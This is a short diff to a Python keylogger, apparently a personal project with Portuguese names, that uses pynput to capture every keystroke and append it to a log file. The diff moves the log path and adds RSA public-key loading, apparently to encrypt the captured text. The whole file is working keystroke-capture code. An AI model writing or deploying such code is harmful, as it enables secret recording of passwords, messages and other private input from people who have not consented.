@@ -1,4 +1,6 @@
 from pynput import keyboard
+import rsa
+
 def on_press(key):
     lista = [".enter",".tab",".space",".backspace",".esc"]
     punições = ["\n","\t"," "]
@@ -16,8 +18,11 @@ def on_press(key):
         text += str(key).strip("'")
     escrever(text)
 def escrever(text):
-    with open('fazendo/keylogger/aaaa.txt',"a") as f:
+    with open('em_espera/keylogger/aaaa.txt',"a") as f:
         f.write(f"{text}")
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
+with open("public.pem", "rb") as f:
+    public_key = rsa.PublicKey.load_pkcs1(f.read())
